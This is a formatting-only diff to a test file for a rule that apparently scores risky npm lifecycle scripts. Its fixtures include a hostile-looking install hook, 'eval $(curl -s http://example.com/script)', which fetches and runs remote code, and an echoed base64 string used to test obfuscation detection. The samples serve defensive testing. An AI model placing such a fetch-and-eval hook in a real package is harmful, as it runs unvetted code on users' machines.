@@ -53,7 +53,7 @@ describe('LifecycleScriptRiskRule', () => {
       const result = await rule.evaluate(packageData);
       expect(result.deduction).toBeGreaterThan(0);
       expect(result.details.findings.length).toBeGreaterThan(0);
-      expect(result.details.findings[0].issues.some((i) => i.type === 'suspicious-command')).toBe(
+      expect(result.details.findings[0].issues.some(i => i.type === 'suspicious-command')).toBe(
         true
       );
     });
@@ -85,7 +85,7 @@ describe('LifecycleScriptRiskRule', () => {
     it('should detect eval with network content', async () => {
       const packageData = {
         scripts: {
-          install: "eval $(curl -s http://example.com/script)",
+          install: 'eval $(curl -s http://example.com/script)',
         },
       };
 
@@ -96,7 +96,8 @@ describe('LifecycleScriptRiskRule', () => {
     });
 
     it('should detect obfuscation (base64)', async () => {
-      const base64String = 'SGVsbG8gV29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgdGhhdCBzaG91bGQgYmUgZGV0ZWN0ZWQ=';
+      const base64String =
+        'SGVsbG8gV29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgdGhhdCBzaG91bGQgYmUgZGV0ZWN0ZWQ=';
       const packageData = {
         scripts: {
           postinstall: `echo ${base64String}`,
@@ -105,7 +106,7 @@ describe('LifecycleScriptRiskRule', () => {
 
       const result = await rule.evaluate(packageData);
       expect(result.deduction).toBeGreaterThan(0);
-      expect(result.details.findings[0].issues.some((i) => i.type === 'obfuscation')).toBe(true);
+      expect(result.details.findings[0].issues.some(i => i.type === 'obfuscation')).toBe(true);
     });
 
     it('should detect require(http) in script', async () => {
@@ -200,4 +201,3 @@ describe('LifecycleScriptRiskRule', () => {
     });
   });
 });
-
